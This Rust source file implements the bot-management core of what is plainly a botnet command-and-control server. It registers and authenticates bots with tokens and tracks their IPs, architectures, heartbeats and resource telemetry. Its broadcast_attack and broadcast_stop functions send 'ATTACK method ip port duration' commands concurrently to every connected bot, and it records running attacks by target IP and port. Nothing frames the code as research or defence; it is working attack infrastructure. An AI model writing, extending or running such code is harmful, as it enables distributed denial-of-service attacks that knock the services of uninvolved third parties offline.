use tokio::sync::Mutex;
use std::sync::Arc;
use std::net::SocketAddr;
use chrono::{DateTime, Utc};
use uuid::Uuid;
use serde::{Deserialize, Serialize};
use sha2::{Sha256, Digest};
use dashmap::DashMap;
use sqlx::{SqlitePool, Row};
use futures::stream::{self, StreamExt};
use tracing::{error, info, debug};
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotToken {
    pub token_hash: String,  
    pub bot_id: Uuid,
    pub arch: String,
    pub created_at: DateTime<Utc>,
    pub last_used: Option<DateTime<Utc>>,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BotInfo {
    pub id: Uuid,
    pub arch: String,
    pub version: String,
    pub ip: SocketAddr,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub is_alive: bool,
    pub active_attack_id: Option<usize>,
    pub last_error: Option<String>,
}
impl BotInfo {
    pub fn new(ip: SocketAddr, arch: String, version: String) -> Self {
        let now = Utc::now();
        Self {
            id: Uuid::new_v4(),
            arch,
            version,
            ip,
            connected_at: now,
            last_seen: now,
            is_alive: true,
            active_attack_id: None,
            last_error: None,
        }
    }
    pub fn update_last_seen(&mut self) {
        self.last_seen = Utc::now();
    }
    pub fn set_error(&mut self, error: String) {
        self.last_error = Some(error);
    }
}
pub struct Bot {
    pub info: Arc<Mutex<BotInfo>>,
    pub cmd_tx: tokio::sync::mpsc::Sender<String>,
}
impl Bot {
    pub fn new(addr: SocketAddr, arch: String, version: String, cmd_tx: tokio::sync::mpsc::Sender<String>) -> Self {
        Self {
            info: Arc::new(Mutex::new(BotInfo::new(addr, arch, version))),
            cmd_tx,
        }
    }
}
pub struct BotManager {
    bots: Arc<DashMap<Uuid, Arc<Bot>>>,
    max_connections: usize,
    pool: SqlitePool,
    telemetry_buffer: Arc<Mutex<Vec<(Uuid, String, f32, f32, DateTime<Utc>)>>>,
}
impl BotManager {
    pub fn new(max_connections: usize, pool: SqlitePool) -> Self {
        Self {
            bots: Arc::new(DashMap::new()),
            max_connections,
            pool,
            telemetry_buffer: Arc::new(Mutex::new(Vec::new())),
        }
    }
    fn hash_token(token: &str) -> String {
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        format!("{:x}", hasher.finalize())
    }
    pub async fn register_bot(&self, arch: String) -> Result<(Uuid, String), String> {
        let bot_id = Uuid::new_v4();
        let token = generate_secure_token(64);  
        let token_hash = Self::hash_token(&token);
        let now = Utc::now();
        sqlx::query("INSERT INTO bot_tokens (token_hash, bot_id, arch, created_at) VALUES (?, ?, ?, ?)")
            .bind(&token_hash)
            .bind(bot_id.to_string())
            .bind(&arch)
            .bind(now)
            .execute(&self.pool)
            .await
            .map_err(|e| format!("Database error: {}", e))?;
        info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
        Ok((bot_id, token))
    }
    pub async fn verify_bot_token(&self, token: &str) -> Option<(Uuid, String)> {
        let token_hash = Self::hash_token(token);
        let row = sqlx::query("SELECT bot_id, arch FROM bot_tokens WHERE token_hash = ?")
            .bind(&token_hash)
            .fetch_optional(&self.pool)
            .await
            .ok()??;
        let bot_id_str: String = row.get("bot_id");
        let arch: String = row.get("arch");
        let bot_id = Uuid::parse_str(&bot_id_str).ok()?;
        if let Err(e) = sqlx::query("UPDATE bot_tokens SET last_used_at = ? WHERE token_hash = ?")
            .bind(Utc::now())
            .bind(&token_hash)
            .execute(&self.pool)
            .await 
        {
            error!("Failed to update last_used_at for bot token: {}", e);
        }
        Some((bot_id, arch))
    }
    pub async fn revoke_token(&self, bot_id: Uuid) -> Result<(), String> {
        let result = sqlx::query("DELETE FROM bot_tokens WHERE bot_id = ?")
            .bind(bot_id.to_string())
            .execute(&self.pool)
            .await
            .map_err(|e| format!("Database error: {}", e))?;
        if result.rows_affected() == 0 {
            return Err(format!("No token found for bot ID {}", bot_id));
        }
        info!("Revoked bot token for bot {}", bot_id);
        Ok(())
    }
    pub async fn list_tokens(&self) -> Vec<BotToken> {
        let rows = match sqlx::query("SELECT token_hash, bot_id, arch, created_at, last_used_at FROM bot_tokens")
            .fetch_all(&self.pool)
            .await 
        {
            Ok(rows) => rows,
            Err(e) => {
                error!("Failed to list bot tokens: {}", e);
                return Vec::new();
            }
        };
        rows.into_iter().filter_map(|row| {
            let bot_id_str: String = row.get("bot_id");
            let bot_id = Uuid::parse_str(&bot_id_str).ok()?;
            Some(BotToken {
                token_hash: row.get("token_hash"),
                bot_id,
                arch: row.get("arch"),
                created_at: row.get("created_at"),
                last_used: row.get("last_used_at"),
            })
        }).collect()
    }
    pub async fn add_bot(&self, bot: Bot) -> Result<Arc<Bot>, String> {
        if self.bots.len() >= self.max_connections {
            return Err(format!("Max bot connections reached: {}", self.max_connections));
        }
        let bot_id = bot.info.lock().await.id;
        let bot_arc = Arc::new(bot);
        self.bots.insert(bot_id, bot_arc.clone());
        Ok(bot_arc)
    }
    pub async fn remove_bot(&self, bot_id: &Uuid) {
        self.bots.remove(bot_id);
    }
    pub async fn get_bot_count(&self) -> usize {
        self.bots.len()
    }
    pub async fn get_all_bots(&self) -> Vec<Arc<Bot>> {
        self.bots.iter().map(|r| r.value().clone()).collect()
    }
    #[allow(dead_code)]
    pub async fn get_bots_by_arch(&self, arch: &str) -> Vec<Arc<Bot>> {
        let mut result = Vec::new();
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            if info.arch == arch {
                result.push(bot.value().clone());
            }
        }
        result
    }
    pub async fn update_bot_heartbeat(&self, bot_id: &Uuid) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.update_last_seen();
        }
    }
    pub async fn set_bot_error(&self, bot_id: &Uuid, error: String) {
        if let Some(bot) = self.bots.get(bot_id) {
            let mut info = bot.info.lock().await;
            info.set_error(error);
        }
    }
    pub async fn log_telemetry(&self, bot_id: Uuid, arch: String, cpu: f32, mem: f32) {
        let mut buffer = self.telemetry_buffer.lock().await;
        buffer.push((bot_id, arch, cpu, mem, Utc::now()));
        if buffer.len() >= 100 {
            drop(buffer); 
            self.flush_telemetry().await;
        }
    }
    pub async fn flush_telemetry(&self) {
        let mut buffer = self.telemetry_buffer.lock().await;
        if buffer.is_empty() {
            return;
        }
        let batch: Vec<_> = buffer.drain(..).collect();
        drop(buffer); 
        if let Ok(mut tx) = self.pool.begin().await {
            for (bot_id, arch, cpu, mem, time) in batch {
                if let Err(e) = sqlx::query("INSERT OR REPLACE INTO bot_telemetry (bot_uuid, arch, cpu_usage, ram_usage, last_seen) VALUES (?, ?, ?, ?, ?)")
                    .bind(bot_id.to_string())
                    .bind(arch)
                    .bind(cpu)
                    .bind(mem)
                    .bind(time)
                    .execute(&mut *tx)
                    .await 
                {
                    error!("Failed to insert telemetry for bot {}: {}", bot_id, e);
                }
            }
            if let Err(e) = tx.commit().await {
                error!("Failed to commit telemetry transaction: {}", e);
            }
        } else {
            error!("Failed to begin telemetry transaction");
        }
    }
    pub async fn cleanup_dead_bots(&self, timeout_secs: i64) {
        let now = Utc::now();
        let mut to_remove = Vec::new();
        for bot in self.bots.iter() {
            let info = bot.value().info.lock().await;
            let elapsed = now.signed_duration_since(info.last_seen);
            if elapsed.num_seconds() >= timeout_secs {
                to_remove.push(*bot.key());
            }
        }
        for id in to_remove {
            self.bots.remove(&id);
        }
    }
    pub async fn broadcast_stop(&self, attack_id: usize) {
        let command = format!("STOP {}\n", attack_id);
        let bots = self.get_all_bots().await;
        stream::iter(bots)
            .for_each_concurrent(1000, |bot| {
                let cmd = command.clone();
                async move {
                    if let Err(e) = bot.cmd_tx.send(cmd).await {
                        debug!("Failed to send stop command to bot: {}", e);
                    }
                }
            })
            .await;
    }
    pub async fn broadcast_attack(&self, attack_id: usize, method: &str, ip: &str, port: u16, duration: u64) {
        let command = format!("ATTACK {} {} {} {} {}\n", attack_id, method, ip, port, duration);
        let bots = self.get_all_bots().await;
        stream::iter(bots)
            .for_each_concurrent(1000, |bot| {
                let cmd = command.clone();
                async move {
                    if let Err(e) = bot.cmd_tx.send(cmd).await {
                        debug!("Failed to send attack command to bot: {}", e);
                    }
                }
            })
            .await;
    }
    pub async fn get_active_attacks(&self) -> Vec<(usize, String, String, u16, u64)> {
        let rows = match sqlx::query("SELECT id, method, target_ip, target_port, duration, started_at FROM attacks WHERE status = 'running'")
            .fetch_all(&self.pool)
            .await 
        {
            Ok(rows) => rows,
            Err(e) => {
                error!("Failed to fetch active attacks: {}", e);
                return Vec::new();
            }
        };
        let mut active_attacks = Vec::new();
        let now = Utc::now();
        for row in rows {
            let id: i64 = row.get("id");
            let method: String = row.get("method");
            let ip: String = row.get("target_ip");
            let port: u16 = row.get("target_port");
            let duration: i64 = row.get("duration");
            let started_at: DateTime<Utc> = row.get("started_at");
            let elapsed = now.signed_duration_since(started_at).num_seconds();
            if elapsed < duration {
                let remaining = (duration - elapsed) as u64;
                active_attacks.push((id as usize, method, ip, port, remaining));
            }
        }
        active_attacks
    }
    pub async fn queue_command(&self, bot_id: Uuid, command: &str) -> Result<(), String> {
        sqlx::query("INSERT INTO pending_commands (bot_id, command) VALUES (?, ?)")
            .bind(bot_id.to_string())
            .bind(command)
            .execute(&self.pool)
            .await
            .map_err(|e| format!("Database error: {}", e))?;
        Ok(())
    }
    pub async fn get_pending_commands(&self, bot_id: Uuid) -> Vec<String> {
        let rows = match sqlx::query("SELECT id, command FROM pending_commands WHERE bot_id = ? ORDER BY created_at ASC")
            .bind(bot_id.to_string())
            .fetch_all(&self.pool)
            .await 
        {
            Ok(rows) => rows,
            Err(e) => {
                error!("Failed to fetch pending commands for bot {}: {}", bot_id, e);
                return Vec::new();
            }
        };
        let mut commands = Vec::new();
        let mut ids = Vec::new();
        for row in rows {
            let id: i64 = row.get("id");
            let cmd: String = row.get("command");
            commands.push(cmd);
            ids.push(id);
        }
        if !ids.is_empty() {
            for id in ids {
                if let Err(e) = sqlx::query("DELETE FROM pending_commands WHERE id = ?")
                    .bind(id)
                    .execute(&self.pool)
                    .await 
                {
                    error!("Failed to delete pending command {} for bot {}: {}", id, bot_id, e);
                }
            }
        }
        commands
    }
}
fn generate_secure_token(length: usize) -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::rngs::OsRng;
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}
